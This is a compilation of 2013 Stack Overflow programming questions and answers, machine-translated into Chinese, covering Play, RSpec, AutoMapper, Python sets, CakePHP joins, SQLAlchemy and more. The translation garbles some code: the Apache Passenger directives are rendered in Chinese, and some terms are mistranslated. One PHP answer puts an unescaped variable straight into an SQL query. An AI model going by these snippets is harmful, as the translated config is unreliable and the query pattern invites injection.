    options(for (lang <- langs) yield (lang.langCode)),
            '_default -> "--- Choose a Language ---",
            '_label -> "Language"
    ) 
```

现在我想使用 datalist HTML 来自动完成带有代码的文本区域。我已经尝试过了，但它没有得到 @lang.langCode 值：

```
@inputText(searchForm("langCode"), '_label -> "Language") 
   <datalist id=langCode>
   @langs.map { lang =>
        <option>
          @lang.langCode
         </option>
    }
   </datalist> 
```

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T23:58:50.750

您的代码大部分是正确的，除了：

1.  将`list`属性添加到`@inputText`参数：

    @inputText(searchForm("langCode"), '_label -> "Language", 'list -> "langCodeDatalist")

2.  确保`id`用于`datalist`与用于输入框的不同：

    <datalist id="langCodeDatalist">

一旦我进行了这些更改，它就起作用了。检查源代码以确保`@lang.langCode`正确粘贴。

# ruby - RSPEC 设置帮助 - Mountain Lion Ruby 1.9.3

> ID：15750670
> 
> 赞同：1
> 
> 时间：2013-04-01T19:51:36.517
> 
> 标签：ruby, macos, rspec

设置我的第一个开发环境，请耐心等待。Running Mountain Lion、Ruby 1.9.3、Gems 1.8.25 和 RVM 1.19.1。

试图让 RSPEC 启动并运行，但我不断收到错误消息。我认为这与我的 PATH 有关，因为大多数关于此的问题都指的是他们的外壳（Bash？）正在寻找错误的位置。

使用这个精彩的教程：[http ://blog.davidchelimsky.net/2007/05/14/an-introduction-to-rspec-part-i/](http://blog.davidchelimsky.net/2007/05/14/an-introduction-to-rspec-part-i/)

我试过运行最简单的 rspec 文件并得到一个错误，所以我尝试在命令行中输入“spec”（不带引号）。这给了我错误“-bash：spec：command not found”（没有引号）。

环顾stackoverflow，发现命令已更新为“rspec”而不是“spec”？所以当我在命令行中输入“rspec”（不带引号）时，我得到了这个废话：

```
Evans-MacBook-Pro:~ Evan$ rspec
/Users/Evan/.rvm/gems/ruby-1.9.3-p392/gems/rspec-core-2.13.1/lib/rspec/core/configuration.rb:819:in `load': cannot load such file -- /Users/Evan/spec (LoadError)
from /Users/Evan/.rvm/gems/ruby-1.9.3-p392/gems/rspec-core-2.13.1/lib/rspec/core/configuration.rb:819:in `block in load_spec_files'
from /Users/Evan/.rvm/gems/ruby-1.9.3-p392/gems/rspec-core-2.13.1/lib/rspec/core/configuration.rb:819:in `each'
from /Users/Evan/.rvm/gems/ruby-1.9.3-p392/gems/rspec-core-2.13.1/lib/rspec/core/configuration.rb:819:in `load_spec_files'
from /Users/Evan/.rvm/gems/ruby-1.9.3-p392/gems/rspec-core-2.13.1/lib/rspec/core/command_line.rb:22:in `run'
from /Users/Evan/.rvm/gems/ruby-1.9.3-p392/gems/rspec-core-2.13.1/lib/rspec/core/runner.rb:80:in `run'
from /Users/Evan/.rvm/gems/ruby-1.9.3-p392/gems/rspec-core-2.13.1/lib/rspec/core/runner.rb:17:in `block in autorun' 
```

关于我对这个问题的先前答案：我试图改变 .bashrc 只是让我对我在做什么感到困惑，而且我认为我的语法不正确（它也不起作用）。

有什么想法吗？非常感激！

埃文

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T19:55:00.217

Rspec 假定您的规范在一个`spec/`找不到的目录中。尝试运行

```
rspec spec_tutorial 
```

顺便提一句。本教程已经过时了。例如，尝试使用[rspec.info](http://rspec.info/)。

# c# - Automapper Project.To 打破 db IQueryable

> ID：15750672
> 
> 赞同：2
> 
> 时间：2013-04-01T19:51:40.600
> 
> 标签：c#, linq, entity-framework, expression, automapper

我有实体：

```
[Table("Representatives")]
public class Representative
{
    [Column("RepID"), Key]
    public int Id { get; set; }
    [Column("MemID")]
    public int MemberId { get; set; }
    public virtual Member Member { get; set; }
}

[Table("Members")]
public class Member
{
    [Column("MemID"), Key]
    public int Id { get; set; }

    [ForeignKey("MemberId")]
    public virtual ICollection<Representative> Representatives { get; set; }
} 
```

与多对一`Representatives`相关。`Member`我想检索一些代表及其父成员并将其全部投影到某个视图模型。我已经像这样配置了自动映射器：

```
 Mapper.CreateMap<Representative, RepresentativeViewModel>()
          .ForMember(m => m.RepId, a => a.MapFrom(x => x.Id))
          .ForMember(m => m.MemberModel, a => a.MapFrom(x => x.Member));

    Mapper.CreateMap<Member, MemberViewModel>()
          .ForMember(m => m.MemId, a => a.MapFrom(x => x.Id))
          .ForMember(m => m.OrganizationName, a => a.MapFrom(x => x.Name)); 
```

如果我运行此代码：

```
var prj = ctx.Representatives.Where(r => r.Id == 1).Project().To<RepresentativeViewModel>(); 
```

然后我得到包含 func 调用（已调试）的表达式树：

```
...
.Lambda #Lambda2<System.Func`2[ConsoleApplication1.Representative,ConsoleApplication1.RepresentativeViewModel]>(ConsoleApplication1.Representative $var1)
{
    .New ConsoleApplication1.RepresentativeViewModel(){
        Name = $var1.Name,
        RepId = $var1.Id,
        MemberModel = .Invoke (.Lambda #Lambda3<System.Func`2[ConsoleApplication1.Member,ConsoleApplication1.MemberViewModel]>)($var1.Member)
    }
}
.Lambda #Lambda3<System.Func`2[ConsoleApplication1.Member,ConsoleApplication1.MemberViewModel]>(ConsoleApplication1.Member $var2)
{
    .New ConsoleApplication1.MemberViewModel(){
        MemId = $var2.Id,
        OrganizationName = $var2.Name
    }
}
... 
```

所以由于某种原因，builder 调用 Func 而不是调用 Expression。你知道为什么会这样吗？如何让我的映射器构建正确的表达式和 SQL 查询？

# python - 在python中存储和搜索坐标的有效方法

> ID：15750681
> 
> 赞同：6
> 
> 时间：2013-04-01T19:52:26.087
> 
> 标签：python, algorithm, search, coordinates

我正在pygame中用python（2.7）编写一个简单的游戏。在这个游戏中，我必须存储 2D 坐标。这些项目的数量将从0开始，每一步增加2。它们将增加到〜6000。在每个步骤中，我必须检查其中是否有 9 个特定坐标。我试图将它们简单地存储在 (x,y) 的列表中，但在这样的列表中搜索效率不高。

**如何存储这些坐标以便在它们之间进行搜索更有效？**

我在每个步骤中尝试做的事情：

```
# Assuming:
myList = []
co1 = (12.3,20.2) # and so on..
valuesToCheck = [co1,co2,co3,co4,co5,co6,co7,co8,co9]

# In each step:
# Adding 2 coordinates
myList.append((x1,y1))
myList.append((x2,y2))
# Searching 9 specific coordinates among all
for coordinate in valuesToCheck:
    if coordinate in myList:
        print "Hit!"
        break
# Note that the valuesToCheck will change in each step.
del valuesToCheck[0]
valuesToCheck.append(co10) 
```

坐标是浮点数，它们的最大值是有限的。它们从 (0.0,0.0) 开始到 (1200.0,700.0)。

我已经对此进行了搜索，但存储的值是字符串或常量。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-04-01T20:02:19.907

在您的列表旁边保留一[组](http://docs.python.org/3.3/tutorial/datastructures.html#sets)，或者如果您没有其他用途，则完全替换该列表。集合的成员资格检查和添加[平均](http://wiki.python.org/moin/TimeComplexity)为 O(1)，因此与仅使用列表的 O(N^2) 相比，您的整体算法将是 O(N)。

```
myList = []
mySet = set()
co1 = (12,20) # and so on..
valuesToCheck = [co1,co2,co3,co4,co5,co6,co7,co8,co9]

# In each step:
# Adding 2 coordinates
myList.append((x1,y1))
myList.append((x2,y2))
mySet.add((x1, y1))
mySet.add((x2, y2))
# Searching 9 specific coordinates among all
for coordinate in valuesToCheck:
    if coordinate in mySet:
        print "Hit!"
        break
# Note that the valuesToCheck will change in each step.

del valuesToCheck[0]
valuesToCheck.append(co10) 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-01T20:03:06.933

如果我理解正确，您正在向 中添加元素`myList`，但从不删除它们。然后，您将`valuesToCheck`在`myList`.

如果是这种情况，您可以通过将 myList 转换为集合而不是列表来提高性能。测试列表中的成员资格是 O(n)，而测试集合中的成员资格通常是 O(1)。

您的语法将基本保持不变：

```
mySet = set()

# your code

# Adding 2 coordinates
mySet.add((x1,y1))
mySet.add((x2,y2))
# Searching 9 specific coordinates among all
for coordinate in valuesToCheck:
    if coordinate in mySet:
        print "Hit!"
        break
# Note that the valuesToCheck will change in each step.
del valuesToCheck[0]
valuesToCheck.append(co10) 
```

# c# - 我应该如何使用属性以及我的类的结构应该是什么，以便在多个类中使用索引器

> ID：15750682
> 
> 赞同：1
> 
> 时间：2013-04-01T19:52:26.830
> 
> 标签：c#

我需要关于如何处理类结构的帮助。我该如何使用`Indexers`？我想要类似的东西

```
Company.Employees[empId].Employee["Designation"].Salary 
```

更具体地说，像 Grid.Rows[rowIndex].Columns["CurrentColumnName"].Width

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T19:56:20.313

添加一个方法，如

```
 public string this[string s]
 {
     get{
         if(s == ...)
          return this.property;
     }

 } 
```

然而，这似乎更像是一种情况`Collections`，但请参阅[此处](http://msdn.microsoft.com/en-us/library/vstudio/6x16t2tx.aspx)以获取完整示例。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T20:11:14.697

实际上，索引器用于按索引获取元素，而您的 EmpId 不是索引的良好候选者，因为它们可能是堆肥或非连续的。

如果您仍然想使用它，这里是代码。它将模仿索引器，但它的修改版本。

```
class Employee
{
    public int EmpId { get; set; }
    public float Salary { get; set; }
    public string Designation { get; set; }
}

class Employees
{
    List<Employee> EmpList = new List<Employee>();

    public Employee this[int empId]
    {
        get
        {
            return EmpList.Find(x => x.EmpId == empId);
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-01T20:20:05.770

我宁愿有一个方法，因为我可以让它通用。

```
public T GetPropertyValue<T>(string property)
{
    var propertyInfo = GetType().GetProperty(property);
    return (T)propertyInfo.GetValue(this, null);
}

var emp = employee.GetPropertyValue<Employee>("Designation");
var salary = emp.Salary; 
```

也就是说......小心有这么多的点符号。当您在日志文件的行中获得 NullReferenceException 时，很难找出究竟是什么为 null。所以宁愿把事情分解一下，有更多的行，然后你解决错误的麻烦就更少了。

# vb.net - VB.NET 秒表/时间跨度

> ID：15750685
> 
> 赞同：1
> 
> 时间：2013-04-01T19:52:39.783
> 
> 标签：vb.net, timespan, stopwatch, elapsed

我正在尝试创建一个秒表，它允许 numbericupdown 根据需要调整时间。现在，如果我在时间流逝时将 numbericupdown 更改为“2”，它将使整个值加倍，包括已经计时的值，这是我不想要的。有没有办法使用秒表来计算从 numbericupdown 的值更改时开始的时间，如果可以的话，有人可以提供一个例子吗？

```
Dim BTStopWatch1 As New Diagnostics.Stopwatch

Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
    Dim elapsed As TimeSpan = Me.BTStopWatch1.Elapsed
    elapsed = New TimeSpan(elapsed.Ticks * NumericUpDown4.Value)
    lblBnch.Text = String.Format("{0:00}   :   {1:00}   :   {2:00}", Math.Floor(elapsed.TotalHours), elapsed.Minutes, elapsed.Seconds)
End Sub

Private Sub Button10_Click(sender As Object, e As EventArgs) Handles Button10.Click
    Timer4.Start()
    Me.BTStopWatch1.Start()
End Sub

Private Sub Button7_Click(sender As Object, e As EventArgs) Handles Button7.Click
    Timer4.Stop()
    Me.BTStopWatch1.Stop()
End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T20:14:59.453

问题出在这一行：

```
elapsed = New TimeSpan(elapsed.Ticks * NumericUpDown4.Value) 
```

您正在将目前的刻度总数乘以 NumericUpDown 的值。这不会考虑 NumericUpDown 的历史。

您想要做的是将经过的滴答数存储在一个变量中，该变量在对`Timer4_Tick`. 然后将 1 添加到该变量乘以来自计时器回调中的 NumericUpDown 的值。您可以通过将调用的变量存储`elapsed`为初始化为零的实例变量并在计算新值时使用加法而不是乘法来做到这一点。

# matlab - 在不断增加的范围内查找连续点

> ID：15750689
> 
> 赞同：0
> 
> 时间：2013-04-01T19:52:55.617
> 
> 标签：matlab, contiguous

我在向量中有一组数据点。例如，

```
 [NaN, NaN, NaN, -1.5363, NaN -1.7664, -1.7475]; 
```

这些数据来自在指定范围内选择 3 个点的代码（特别是 -0.6 和 0.6）。如果该范围内不存在该列中的三个点，则该范围将递增扩展，直到找到三个点。在上面的示例中，范围增加到 -1.8 到 1.8。然而，我们正在分析的数据是不稳定的，并且具有随机的波峰和波谷，导致不连续的点被接受到范围内（元素 3 被选择为有效，但元素 4 不被接受）。

解决此问题的最佳方法是什么？我已经有一个代码来逐步增加范围以找到三个点，我只需将其修改为不在任何三个点处停止，而是增加范围直到找到三个连续点。如果对上面的例子这样做，我只会评估斜率以删除第三个元素（因为在 3 和 4 之间，斜率是负数）。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T22:09:48.520

假设您在示例中提供的数据在变量中，`x`您可以像这样使用：`isnan``findstr`

```
x = [NaN, NaN, NaN, -1.5363, NaN -1.7664, -1.7475, 123];
~isnan(x)

ans =

 0     0     0     1     0     1     1     1

pos = findstr(~isnan(x), [1 1 1]); 
```

像这样使用的原因`findstr`是我们想`[1 1 1]`在返回的逻辑数组中找到序列`isnan`，`findstr`并将返回输入数组中该序列出现的位置的索引。

对于您的示例数据，这将返回`[]`，但如果您将其更改为我给出的示例中的数据，它将返回 6，您可以使用 提取连续区域`x(pos:pos+2)`。`[6 7]`对于超过 3 个连续值的情况（如果有 4 个，它将返回）以及有多个连续区域的情况，您必须小心。如果您不需要对这些情况做任何有意义的事情，那么只需使用 pos(1)。

如果要提取长度大于或等于 3 的第一个连续区域的整体，可以执行以下操作：

```
x = [NaN, NaN, NaN, -1.5363, NaN -1.7664, -1.7475, 123, 456, 789];

startPos = [];
stopPos = [];

pos = findstr(~isnan(x), [1 1 1]);
if ~isempty(pos)
    startPos = pos(1);
    stopPos = startPos + 2;

    % Find any cases where we have consecutive numbers in pos
    if length(pos) > 1 && any(diff(pos) == 1)
        % We have a contiguous section longer than 3 elements

        % Find the NaNs
        nans = find(isnan(x));
        % Find the first NaN after pos(1), or the index of the last element
        stopPos = nans(nans > startPos);
        if ~isempty(stopPos)
            stopPos = stopPos(1) - 1; % Don't want the NaN
        else
            stopPos = length(x);
        end
    end
end

x(startPos:stopPos) 
```

# asp.net-mvc - 如何在 MVC 中处理站点范围的查询字符串参数？

> ID：15750690
> 
> 赞同：0
> 
> 时间：2013-04-01T19:52:58.320
> 
> 标签：asp.net-mvc

我需要能够处理整个站点的查询字符串参数（例如 ?promo=38 ）。我正在尝试此处指定的过程[将 {sitename} 参数传递给 MVC 控制器操作](https://stackoverflow.com/questions/2237375/passing-a-sitename-parameter-to-mvc-controller-actions)，但它不起作用。我猜这是因为根据[http://blog.stevensanderson.com/2007/11/20/aspnet-mvc-pipeline-lifecycle/](http://blog.stevensanderson.com/2007/11/20/aspnet-mvc-pipeline-lifecycle/)查询字符串处理发生在控制器实例化之后。

那么实现我想要的简单方法是什么？即，能够从我站点中任何位置的查询字符串参数执行诸如设置基本控制器属性或设置会话变量之类的操作，而无需在所有控制器操作中手动指定某些内容？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T19:57:08.573

按照@jrummell 的建议，覆盖`OnActionExecuting()`您的基本控制器或[动作过滤器。](http://www.asp.net/mvc/tutorials/older-versions/controllers-and-routing/understanding-action-filters-cs)一个动作过滤器可能是要走的路，但你仍然需要装饰你的所有控制器或创建一个基本控制器并用它来装饰它。

```
public class PromoActionFilter : ActionFilterAttribute
{
    public override void OnActionExecuting(ActionExecutingContext filterContext)
    {
        filterContext.Controller.ViewBag.Promo = filterContext.HttpContext.Request.QueryString("Promo");

        base.OnActionExecuting(filterContext);
    }
}

[PromoActionFilter]
public class BaseController : Controller
{
    ... Some Actions ...
} 
```

# actionscript-3 - Flash AS3 和网络摄像头：AIR 的问题

> ID：15750697
> 
> 赞同：0
> 
> 时间：2013-04-01T19:53:21.277
> 
> 标签：actionscript-3, air, webcam

我在让 Flash AS3 相机正常工作时遇到一些问题。如果您能提供帮助，不胜感激。我查看了 ol 的详细信息：

在发布到 SWF 时，我可以让网络摄像头启动并运行，一切正常，弹出“我可以访问您的摄像头对话框”，它返回静音与否。

• 第一个问题：有什么方法可以让我绕过用户权限，即始终授予它？我们正在运行一个自助服务终端应用程序。以下方法是否适用于 AIR 应用程序？[https://stackoverflow.com/questions/3266939/flash-grant-access-to-webcam-programmatically-behind-the-scenes](https://stackoverflow.com/questions/3266939/flash-grant-access-to-webcam-programmatically-behind-the-sceness-to-webcam-programmatically-behind-the-scenes)

• 第二个问题：正如我所说，当在 IDE 和浏览器中发布 SWF 时，我可以让网络摄像头/相机连接正常工作。但是，如果我将项目切换为为 AIR 发布并运行 air 应用程序，或者在 IDE 中进行测试，我根本不会出现安全权限对话框。没有。也许安全盒不在屏幕上？有什么方法可以控制位置吗？在 AIR 中使用网络摄像头有什么不同吗？

我很高兴不发布到 AIR，而是使用 SWF — 只需要能够读取/写入本地磁盘上的 XML 文件并认为 AIR 是唯一的方法吗？

谢谢你的帮助！

编码：

```
private function initTracking() : void
    {

        var camW : int = 840;
        var camH : int = 640;

        // Create the camera
        _cam = Camera.getCamera();

        if (_cam == null) 
        { 
            trace("Unable to locate available cameras."); 
            return;
        } 
        else 
        { 
            trace("Found camera: " + _cam.name); 
            _cam.addEventListener(StatusEvent.STATUS, camStatusHandler); 

            _cam.setMode(camW, camH, stage.frameRate);

            // Create a video
            _vid = new Video(camW, camH);
            _vid.attachCamera(_cam);
            trace("camera ", _cam, " attached to video ", _vid);

            // Create the Motion Tracker
            _motionTracker = new MotionTracker(_vid);

            // We flip the input as we want a mirror image
            _motionTracker.flipInput = true;

        }
    }

    private function camStatusHandler(event:StatusEvent):void 
    { 
                trace("camStatusHandler::");

        if (_cam.muted) 
        { 
            trace("Unable to connect to active camera."); 
        } 
        else 
        { 

        trace("able to connect to active camera.");
                addEventListener(Event.ENTER_FRAME, onEnterFrameHandler, false,0,true);

        } 
        // Remove the status event listener. 
        _cam.removeEventListener(StatusEvent.STATUS, camStatusHandler); 
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T20:15:17.003

如果您作为 AIR 发布，则没有安全对话框（swfs 的安全框可以阻止“黑客”在不知情的情况下控制用户的网络摄像头）。

如果您的代码在 swf 中运行，它也应该在 AIR 应用程序中运行而无需任何更改 - 假设 AIR 在桌面而不是移动设备上运行？

如果您在发布为 AIR 应用程序时没有看到网络摄像头输出，请发布相关代码。

编辑：

AIR 应用程序不会发生 StatusEvent.STATUS 事件 - 它在用户关闭安全对话框时触发 - 因此永远不会调用 camStatusHandler。

所以完全删除 camStatusHandler 函数和这一行：

```
_cam.addEventListener(StatusEvent.STATUS, camStatusHandler); 
```

并将来自 camStatusHandler 的重要代码添加到 initTracking 的末尾：

```
addEventListener(Event.ENTER_FRAME, onEnterFrameHandler, false,0,true); 
```

# rvm - 乘客使用 Ruby 系统版本而不是 RVM 中的 Ruby

> ID：15750699
> 
> 赞同：1
> 
> 时间：2013-04-01T19:53:26.870
> 
> 标签：rvm, passenger, production-environment, ruby-1.9.3, mod-rails

我在 Debian 环境中使用 RVM (1.19)、Passenger (3.0.19)、Apache。

我尝试使用 RVM 将 ruby​​ 版本从 1.8.7 更新到 1.9.3。执行了以下步骤：

*   rvm 安装 1.9.3
*   rvm rvmrc 到 .ruby-version （在我的 Rails 应用程序文件夹中）
*   rvm use 1.9.3 & gem install Passenger & rvm Passenger-install-apache2-module（在我的 1.9.3 环境中安装乘客和 apache2-module）
*   更新了“/etc/apache2/mods-available/”中的“mod_rails.load”文件：

```
LoadModule 乘客模块 /usr/local/rvm/gems/ruby-1.9.3-p392/gems/passenger-3.0.19/ext/apache2/mod_passenger.so
乘客根 /usr/local/rvm/gems/ruby-1.9.3-p392/gems/passenger-3.0.19
乘客Ruby /usr/local/rvm/wrappers/ruby-1.9.3-p392/ruby

```

*   最后，我重新启动了 apache 服务器。

毕竟，我的应用程序仍在使用 Ruby 1.8.7，Passenger 正在从“/var/lib/gems/1.8/gems/”获取宝石。所以我猜乘客忽略了 mod_rails.load 中的配置。

有谁知道如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-05T15:12:15.273

`ruby -v`输出什么？

如果`1.8.7`尝试`rvm use 1.9.3`并确保将 1.9.3 设置为默认值。

`rvm default 1.9.3`

并且您`.rvmrc`的来源是您的`.bash_profile`，例如：

```
`[[ -s "$HOME/.rvm/scripts/rvm" ]] && source "$HOME/.rvm/scripts/rvm"` 
```

还`which rvm`返回什么？那应该是您用来加载 gem 的文件路径的开始。它通常像`/Users/local/.rvm`

# php - MySQL 列值上的 HTML 行数变量

> ID：15750704
> 
> 赞同：0
> 
> 时间：2013-04-01T19:53:36.023
> 
> 标签：php, html, mysql

我试图弄清楚如何进行查询，根据教师希望临床进行的周数设置行（周数），这个值存储在一个名为临床的 Mysql 表中，列名是周（整数）。现在在我的 HTML 中，我刚刚粘贴了 4 行来向下看。我意识到我需要在这段代码之前连接到数据库

```
<table width="1000" border="1">
<tr>
    <td colspan="8" style="background-color:#1589FF;text-align:center;">
    <h1>Rating for the Week</h1>
    </td>
<tr>
    <th>Week</th>
    <th>Faculty Signature</th>
    <th>Rating for the Week <br>
        S+/S/NI/U</th>
    <th>Student Signature</th>
    <th>Rating for the Week <br>
        S+/S/NI/U</th>

</tr>
    <tr>
    <tr ALIGN="CENTER">
    <td>1</td>
    <td><form><input type = "submit" /></form></td> 
    <td><select>
        <option value="S+">S+</option>
        <option value="S">S</option>
        <option value="NI">NI</option>
        <option value="U">U</option>
        </select></td>
    <td><form><input type = "submit" /></form></td>
    <td><select>
        <option value="S+">S+</option>
        <option value="S">S</option>
        <option value="NI">NI</option>
        <option value="U">U</option>
        </select></td>
</tr>
    <tr>
    <tr ALIGN="CENTER">
    <td>2</td>
    <td><form><input type = "submit" /></form></td> 
    <td><select>
        <option value="S+">S+</option>
        <option value="S">S</option>
        <option value="NI">NI</option>
        <option value="U">U</option>
        </select></td>
    <td><form><input type = "submit" /></form></td>
    <td><select>
        <option value="S+">S+</option>
        <option value="S">S</option>
        <option value="NI">NI</option>
        <option value="U">U</option>
        </select></td>
</tr>
    <tr>
    <tr ALIGN="CENTER">
    <td>3</td>
    <td><form><input type = "submit" /></form></td> 
    <td><select>
        <option value="S+">S+</option>
        <option value="S">S</option>
        <option value="NI">NI</option>
        <option value="U">U</option>
        </select></td>
    <td><form><input type = "submit" /></form></td>
    <td><select>
        <option value="S+">S+</option>
        <option value="S">S</option>
        <option value="NI">NI</option>
        <option value="U">U</option>
        </select></td>
</tr>
<tr>
    <tr ALIGN="CENTER">
    <td>4</td>
    <td><form><input type = "submit" /></form></td> 
    <td><select>
        <option value="S+">S+</option>
        <option value="S">S</option>
        <option value="NI">NI</option>
        <option value="U">U</option>
        </select></td>
    <td><form><input type = "submit" /></form></td>
    <td><select>
        <option value="S+">S+</option>
        <option value="S">S</option>
        <option value="NI">NI</option>
        <option value="U">U</option>
        </select></td>
</tr>
<tr>
    <td colspan="8" style="background-color:#1589FF;text-align:center;">
    <b> The student must pass the clinical component of the course which is        ted on a pass/fail basis.<br>
    A clinical failure results in a grade of F for the course.<b>
    </td>
</tr>
    </table>
    </body>
    </html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T01:54:24.720

查询将如下所示：

```
SELECT weeks FROM `clinical` WHERE clinicname = $clinicname 
```

`weeks`该查询将从我添加了 WHERE 语句的表中选择列，`clinical`

因为如果有多个诊所，只要`clinicname`您的表中包含该列，它就会选择适当的一个。

要为每周创建一行，您将创建一个 while 循环，如下所示：

```
<?php 
$number_of_weeks_from_query = $query_result;
$i = 0;
while($i < $number_of_weeks_from_query){

INSERT EACH ROW TEMPLATE HERE AND CHANGE THE WEEK NUMBER TO $i

$i++;
}
?> 
```

我建议使用 Mysql PDO，因为旧的 MySql 函数将很快被弃用。我还建议使用 AJAX，以便在有人点击提交按钮时保持页面加载。如果我做错了什么，请告诉我，我的 PHP 仍然生锈。

# cakephp - 如何在 CakePHP 的两个连接表中按条件查找

> ID：15750705
> 
> 赞同：4
> 
> 时间：2013-04-01T19:53:37.447
> 
> 标签：cakephp

在我的 CakePHP 应用程序中，我有三个表：

`Businesses`,`Towns`和`Categories`.

一个企业可以属于多个城镇和多个类别，因此我创建了连接表`hasMany`和`belongsTo`关系。通过使用城镇或类别模型搜索按城镇或类别查找企业时，一切正常，但当我想搜索某个城镇和某个类别的企业时，我完全卡住了，例如。伦敦的水管工。

在使用业务模型进行搜索时，这些关联似乎不起作用，并且`column not found`在尝试使用关联表时出现错误。我认为这符合需要做的事情，但我无法让它发挥作用：

```
$this->set('listings', $this->Business->find('all', array(
    'conditions' => array(
        'Business.approved' => 1,
        'BusinessesCategory.category_id' => $id,
        'BusinessesTown.town_id' => $town_id,
        'Business.sasite' => 1
) 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-01T20:57:03.070

您需要加入表格才能做到这一点。我将在上面举一个例子，如何使用类别，你可以自己做城镇。

```
$this->Business->find("all", array(
        "joins" => array(
            array(
                "table" => "businness_categories",
                "alias" => "BusinessesCategory",
                "type" => "LEFT",
                "conditions" => array(
                    "Businesses.id = BusinessesCategory.business_id"
                )
            ),
            array(
                "table" => "categories",
                "alias" => "Category",
                "type" => "LEFT",
                "conditions" => array(
                    "BusinessesCategory.category_id = Category.id"
                )
            )
        ),
        'conditions' => array(
            'Business.approved' => 1,
            'Category.id' => $id,
        )
    )); 
```

您也可以使用一种行为为您执行此操作： [https ://github.com/Scoup/SuperJoin](https://github.com/Scoup/SuperJoin)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-01-01T13:13:52.743

嗨，我有一个非常相似的设置和同样的问题。这就是我将如何解决您的问题：
由于您没有放弃您的大部分代码，我做了一些假设：
-您在 BusinessController 中实现了您的搜索方法
-您的城镇搜索参数存储在变量 $where 和一个 for类别存储在 $what

*如果您只有一张表的条件，则编码*

```
 $this->Businesses->Town->recursive = -1;
    ....
    $options['joins'] = array(
            array('table' => 'towns',
            'alias' => 'Town',
            'type' => 'inner',
            'conditions' => array(
                'Business.town_id = Town.id',
            )
            )
        );
        $options['conditions'] = array(
            'Town.townName' => $where
        );
        $result = $this->Business->find('all', $options); 
```

*如果您有两个表的条​​件，请编写代码*

```
 $this->Businesses->Town->recursive = -1;
    $this->Businesses->Category->recursive = -1;
    ....
    $options['joins'] = array(
            array('table' => 'towns',
            'alias' => 'Town',
            'type' => 'inner',
            'conditions' => array(
                'Business.town_id = Town.id',
            )
            ),
           array('table' => 'categories',
            'alias' => 'Category',
            'type' => 'inner',
            'conditions' => array(
                'Business.category_id = category.id',
            )
            )
        );
        $options['conditions'] = array( 
                'Town.townName' => $where,
            'Category.categoryName' => $what
        );
        $result = $this->Business->find('all', $options); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-04-09T08:53:17.013

您可以使用

```
$this->Business->find('all', array(
    'conditions' => array(
          'AND' => array(
             'BusinessesTown.town_id' => $town_id,
             'BusinessesCategory.category_id' => $id
        )
      ),
    'recursive' => 2
)); 
```

# python - 使用 sqlalchemy 和 pyodbc 连接到 SQL Server 2012

> ID：15750711
> 
> 赞同：47
> 
> 时间：2013-04-01T19:53:59.713
> 
> 标签：python, sql-server, sqlalchemy, pyodbc

我正在尝试在 Python 3.3（Windows 7-64 位）上使用 SQLAlchemy（带有 pyodbc）连接到 SQL Server 2012 数据库。我可以使用直接 pyodbc 进行连接，但使用 SQLAlchemy 连接失败。我有用于数据库访问的 dsn 文件设置。

我像这样使用直接 pyodbc 成功连接：

```
con = pyodbc.connect('FILEDSN=c:\\users\\me\\mydbserver.dsn') 
```

对于 sqlalchemy，我尝试过：

```
import sqlalchemy as sa
engine = sa.create_engine('mssql+pyodbc://c/users/me/mydbserver.dsn/mydbname') 
```

该`create_engine`方法实际上并没有建立连接并成功，但是如果我尝试一些导致 sqlalchemy 实际建立连接的方法（如`engine.table_names()`），它需要一段时间但随后返回此错误：

`DBAPIError: (Error) ('08001', '[08001] [Microsoft][ODBC SQL Server Driver][DBNETLIB]SQL Server does not exist or access denied. (17) (SQLDriverConnect)') None None`

我不确定哪里出了问题，如何查看 sqlalchemy 实际将什么连接字符串传递给 pyodbc。我已经成功地将相同的 sqlalchemy 类与 SQLite 和 MySQL 一起使用。

提前致谢！

* * *

## 回答 #1

> 赞同：58
> 
> 时间：2013-04-01T20:08:22.140

SQLAlchemy 将基于文件的 DSN 字符串解释为 server name = `c`, database name = `users`。

我更喜欢在不使用 DSN 的情况下进行连接，这是在代码迁移期间处理的一项较少的配置任务。

此语法使用 Windows 身份验证工作：

```
engine = sa.create_engine('mssql+pyodbc://server/database') 
```

或使用 SQL 身份验证：

```
engine = sa.create_engine('mssql+pyodbc://user:password@server/database') 
```

[SQLAlchemy在此处](http://docs.sqlalchemy.org/en/latest/dialects/mssql.html#module-sqlalchemy.dialects.mssql.pyodbc)对不同的连接字符串选项进行了详尽的解释。

* * *

## 回答 #2

> 赞同：36
> 
> 时间：2018-03-18T01:03:12.063

在 Python 3 中，您可以使用[`quote_plus`](https://docs.python.org/3/library/urllib.parse.html#urllib.parse.quote_plus)模块中的函数`urllib.parse`来创建连接参数：

```
import urllib
params = urllib.parse.quote_plus("DRIVER={SQL Server Native Client 11.0};"
                                 "SERVER=dagger;"
                                 "DATABASE=test;"
                                 "UID=user;"
                                 "PWD=password")

engine = sa.create_engine("mssql+pyodbc:///?odbc_connect={}".format(params)) 
```

为了使用 Windows 身份验证，您需要使用*Trusted_Connection*作为参数：

```
params = urllib.parse.quote_plus("DRIVER={SQL Server Native Client 11.0};"
                                 "SERVER=dagger;"
                                 "DATABASE=test;"
                                 "Trusted_Connection=yes") 
```

在 Python 2 中，您应该使用[`quote_plus`](https://docs.python.org/2/library/urllib.html#urllib.quote_plus)库中的函数`urllib`：

```
params = urllib.quote_plus("DRIVER={SQL Server Native Client 11.0};"
                           "SERVER=dagger;"
                           "DATABASE=test;"
                           "UID=user;"
                           "PWD=password") 
```

* * *

## 回答 #3

